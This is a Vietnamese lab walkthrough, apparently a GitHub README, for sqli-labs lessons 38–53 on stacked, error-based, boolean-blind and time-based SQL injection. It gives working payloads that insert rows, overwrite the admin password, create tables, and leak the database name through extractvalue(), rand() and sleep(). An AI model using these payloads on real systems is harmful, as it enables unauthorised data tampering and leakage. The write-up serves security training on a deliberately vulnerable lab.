# sql-labs (Stacked)

Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)

- [Less-38](#Less-38)
- [Less-39](#Less-39)
- [Less-40](#Less-40)
- [Less-41](#Less-41)
- [Less-42](#Less-42)
- [Less-43](#Less-43)
- [Less-44](#Less-44)
- [Less-45](#Less-45)
- [Less-46](#Less-46)
- [Less-47](#Less-47)
- [Less-48](#Less-48)
- [Less-49](#Less-49)
- [Less-50](#Less-50)
- [Less-51](#Less-51)
- [Less-52](#Less-52)
- [Less-53](#Less-53)

## Less-38

Ở câu này, chúng ta đã qua một khái niệm khác của SQLi gọi là `Stacked Queries SQL Injection (SQLi)`.

Như chúng ta đã biết, dấu `;` được sử dụng để kết thúc một câu lệnh trong SQL. Và trong dạng `Stacked` này, chúng ta có thể inject nhiều câu query vào database và với nhiều câu lệnh khác nhau như `CREATE`, `INSERT`... thậm chí là các câu lệnh nguy hiểm như `DELETE`,`DROP`.

Payload mình sử dụng câu lệnh `INSERT`.

Hình dưới là khi chưa inject vào.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-38_1.png?raw=true)

Payload: `?id=1%27;insert+into+users(id,username,password)+values(%271337%27,%27nguyendqn%27,%27Less-38%27)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-38_2.png?raw=true)

## Less-39

```mysql
SELECT * FROM users WHERE id=$id LIMIT 0,1
```

Tương tự câu 38.

Payload: `?id=1;insert%20into%20users(id,username,password)%20values(%2739%27,%27dqnn%27,%27Less-39%27)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-39.png?raw=true)

## Less-40

```mysql
SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```

Tương tự 2 câu trước, chỉ là thay đổi câu query.

Payload: `?id=1%27);insert%20into%20users(id,username,password)%20values(%2740%27,%27user40%27,%27Less-40%27)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-40.png?raw=true)

## Less-41

```mysql
SELECT * FROM users WHERE id=$id LIMIT 0,1
```

Tương tự 3 câu trên. :joy:

Payload: `?id=1;insert%20into%20users(id,username,password)%20values(%2741%27,%27user41%27,%27Less-41%27)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-41.png?raw=true)

## Less-42

Về cơ bản câu này tương tự câu 24, nhưng ở đây chúng ta vẫn sử dụng `Stacked` để bypass.

Cụ thể là mình sẽ sử dụng `UPDATE` để update password của admin.

Đây là pasword của admin khi mình chưa inject câu query.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-41.png?raw=true)

Sau khi chèn câu query.

Payload: `login_user=admin&login_password=1';UPDATE+users+SET+password='i-hacked-u-again'+WHERE+username+='admin'--+&mysubmit=Login`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-42.png?raw=true)

## Less-43

```mysql
SELECT * FROM users WHERE username=('$username') and password=('$password')
```

```php
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password"];
```

Tương tự các câu trước, mình có thể inject ở `login_password`.

Trước khi inject.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-42.png?raw=true)

Payload: `login_user=admin&login_password=1');insert+into+users(id,username,password)+values('43','user43','Less-43')&mysubmit=Login`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-43.png?raw=true)

## Less-44

```mysql
SELECT * FROM users WHERE username='$username' and password='$password'
```

Tương tự câu trên.

Payload: `login_user=admin&login_password=1';insert+into+users(id,username,password)+values('44','user44','Less-44')--+&mysubmit=Login`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-44.png?raw=true)

## Less-45

```mysql
SELECT * FROM users WHERE username=('$username') and password=('$password')
```

Tương tự câu 43.

## Les-46

```mysql
SELECT * FROM users ORDER BY $id
```

Ở câu này, câu query trả về danh sách user sắp xếp theo `$id`.

 Để bypass câu này, có khá nhiều cách

- Bypass thông qua lỗi, sử dụng `extractvalue()`, `updatexml()`
  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-46_1.png?raw=true)

- Bypass thông qua Bool, dựa vào kết quả trả về là `True` hay `False` mà  ta có thể leak data từ database(Blind).
  Hình dưới là kết quả trả về `True`.
  Payload: `?sort=rand(left(database(),1)=%27s%27)`

  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-46_2.png?raw=true)
  Còn đây là kết quả trả về `False`
  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-46_3.png?raw=true)

## Less-47

```mysql
SELECT * FROM users ORDER BY '$id'
```

Tương tự câu 46.

Payload: `?sort=1%27+and+extractvalue(0x0a,concat(0x0a,(select%20database())))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-47.png?raw=true)

## Less-48

```mysql
SELECT * FROM users ORDER BY $id
```

Câu này thuộc loại `Error based - Blind - Numberic`, dựa vào kết quả trả về `True`, `False` mà leak data từ database.

Khi kết quả là `True`

Payload: `?sort=rand(left(database(),1)=%27s%27)`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-46_2.png?raw=true)

Khi kết quả là `False`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-46_3.png?raw=true)

## Less-49

Trong câu này, kết quả sẽ không trả về lỗi, nên ta không thể sử dụng `extractvalue()` hay `updatexml()`.

Và mình sẽ sử dụng `IF()` và sẽ `sleep()` khi kết quả là `False`.

Đây là syntax của `IF()` trong mysql.

`IF(*condition*, *value_if_true*, *value_if_false*)`

Payload: `?sort=1%27+and+If(left((select+database()),1)=%27s%27,0,sleep(3))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-49.png?raw=true)

## Less-50

Trong câu này, đề bài có sử dụng `mysqli_multi_query()`, tức là nó có thể thực thi nhiều câu query thay vì một câu query như `mysqli_query()`.

Nên chỉ cần inject câu query vào sau dấu `;`

Payload: `?sort=1; create table less50 like users;--+ `

## Less-51

Ở câu này, mình có thể inject nhiều câu query cùng lúc thông qua `mysqli_multi_query()`, và trong câu này còn trả về kết quả khi lỗi trong `mysqli_error()`.

Payload tương tự câu 50 hoặc sử dụng `extractvalue()`.

`?sort=1%27%20and%20extractvalue(0x0a,concat(0x0a,(select%20database())))--+`

## Less-52

Tương tự câu 50, vẫn là `Stacked Injection`, nhưng lỗi mysql sẽ không hiển thị.

Payload: `?sort=1; create table less51 like users;--+ `

## Less-53

Tương tự câu 51, và lỗi mysql sẽ không hiển thị.